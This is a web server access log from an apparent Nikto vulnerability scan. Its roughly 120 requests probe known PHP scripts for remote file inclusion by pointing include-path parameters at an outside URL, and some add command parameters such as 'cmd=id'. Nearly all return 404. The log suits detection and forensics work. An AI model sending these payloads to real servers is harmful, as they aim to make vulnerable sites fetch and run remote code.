172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/articles.inc.php?GLOBALS[CHEMINMODULES]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004851)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/config.inc.php?x[1]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004852)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/design.inc.php?dir[data]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004853)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/download_center_lite.inc.php?script_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004854)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/formmail.inc.php?script_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004855)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/gabarits.php?cfg_racine=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004856)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/header.inc.php?ficStyle=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004857)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/ifunctions.php?GLOBALS[phpQRootDir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004858)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/inc.php?cfg_racine=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004859)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/indexhead.php?fileloc=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004860)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/irayofuncs.php?irayodirhack=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004861)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/irayofuncs.php?irayodirhack=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004862)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/libs/Smarty_Compiler.class.php?plugin_file=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004863)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/libs/core/core.display_debug_console.php?plugin_file=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004864)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/libs/core/core.load_plugins.php?plugin_file=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004865)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/libs/core/core.load_resource_plugin.php?plugin_file=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004866)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/libs/core/core.process_cached_inserts.php?plugin_file=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004867)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/libs/core/core.process_compiled_include.php?plugin_file=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 538 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004868)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/libs/core/core.read_cache_file.php?plugin_file=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004869)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/linkbar.php?cfile=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004870)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/login.php?pathCGX=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004871)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/logingecon.php?pathCGX=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004872)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/ltdialogo.php?pathCGX=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004873)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/mtdialogo.php?pathCGX=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004874)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/nuke_include.php?newsSync_enable_phpnuke_mod=1&newsSync_NUKE_PATH=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004875)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/prepend.inc.php?path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004876)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/service.alert.inc.php?SPL_CFG[dirroot]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004877)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/settings.php?inc_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004878)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/settings.ses.php?SPL_CFG[dirroot]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004879)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/shows.inc.php?cutepath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004880)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc/sige_init.php?SYS_PATH=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004881)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc_group.php?include_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004882)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc_group.php?include_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004883)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc_manager.php?include_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004884)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc_manager.php?include_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004885)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc_newgroup.php.php?include_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004886)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc_newgroup.php.php?include_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004887)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc_smb_conf.php?include_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004888)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc_smb_conf.php?include_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004889)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc_user.php?include_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004890)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /inc_user.php?include_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004891)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include.php?_APP_RELATIVE_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004892)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include.php?gorumDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004893)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include.php?myng_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004894)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include.php?path=psp/user.php&site=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004895)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include.php?path[docroot]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004896)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include.php?sunPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004897)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/Beautifier/Core.php?BEAUT_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004898)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/HTML_oben.php?include_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004899)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/HTML_oben.php?include_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004900)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/SQuery/gameSpy2.php?libpath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004901)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/bbs.lib.inc.php?site_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004902)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/class_yapbbcooker.php?cfgIncludeDirectory=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004903)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/classes.php?INCLUDE_DIR=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004904)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/client.php?INCLUDE_DIR=http://cirt.net/rfiinc.txt?? HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/cls_headline_prod.php?INCLUDE_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004906)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/cls_listorders.php?INCLUDE_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004907)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/cls_viewpastorders.php?INCLUDE_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004908)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/common.php?XOOPS_ROOT_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004909)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/common_functions.php?baros_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004910)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/config.inc.php?racine=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004911)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/copyright.php?tsep_config[absPath]=http://cirt.net/rfiinc.txt??cmd=ls HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004912)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/customize.php?l=http://cirt.net/rfiinc.txt?&text=Hello%20World HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004913)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/customize.php?l=http://cirt.net/rfiinc.txt?&text=Hello%20World HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/default_header.php?script_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004915)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/define.php?INC_DIR=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004916)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/disp_form.php3?cfg_include_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004917)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/disp_smileys.php3?cfg_include_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004918)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/dom.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004919)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/dtd.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004920)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/editfunc.inc.php?NWCONF_SYSTEM[server_path]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004921)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/engine/content/elements/menu.php?CONFIG[AdminPath]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004922)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/forms.php?INCLUDE_DIR=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004923)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/global.php?pfad=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004924)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/header.php?cs_base_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004925)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/html/nettools.popup.php?DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004926)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/inc.foot.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004927)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/inc_ext/spaw/dialogs/table.php?spaw_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004928)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/inc_freigabe.php?include_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004929)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/inc_freigabe.php?include_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004930)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/inc_freigabe1.php?include_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004931)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/inc_freigabe1.php?include_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004932)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/inc_freigabe3.php?include_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004933)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/inc_freigabe3.php?include_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004934)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/include_stream.inc.php?include_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004935)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/include_top.php?g_include=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004936)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/includes.php?include_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004937)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/index.php3?cfg_include_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004938)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/init.inc.php?G_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004939)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/issue_edit.php?INCLUDE_DIR=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004940)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/lib/lib_slots.php?main_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004941)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/lib/lib_stats.php?main_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004942)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/lib/lib_users.php?main_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004943)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/little_news.php3?cfg_include_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004944)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/livre_include.php?no_connect=lol&chem_absolu=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004945)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/loading.php?path_include=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004946)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/mail.inc.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004947)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/menu_builder.php?config[page_dir]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004948)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/misc/mod_2checkout/2checkout_return.inc.php?DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 542 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004949)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/monitoring/engine/MakeXML.php?fileOreonConf=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004950)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/parser.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004951)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/pear/IT.php?basepath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004952)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/pear/IT.php?basepath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004953)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/pear/ITX.php?basepath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004954)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/pear/ITX.php?basepath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004955)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/pear/IT_Error.php?basepath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004956)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/pear/IT_Error.php?basepath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004957)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/phpxd/phpXD.php?appconf[rootpath]=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004958)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/prodler.class.php?sPath=http://cirt.net/rfiinc.txt???? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004959)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/scripts/export_batch.inc.php?DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004960)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/scripts/run_auto_suspend.cron.php?DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004961)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/scripts/send_email_cache.php?DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004962)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/startup.inc.php?root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004963)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/themes/themefunc.php?myNewsConf[path][sys][index]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004964)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/timesheet.php?config[include_dir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004965)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /include/urights.php?CRM_inc=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004966)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/admin_board2.php?phpbb_root_path=http://cirt.net/rfiinc.txt??ls HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004967)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/admin_logger.php?phpbb_root_path=http://cirt.net/rfiinc.txt??ls HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004968)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/adodb/back/adodb-postgres7.inc.php?ADODB_DIR=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004969)"
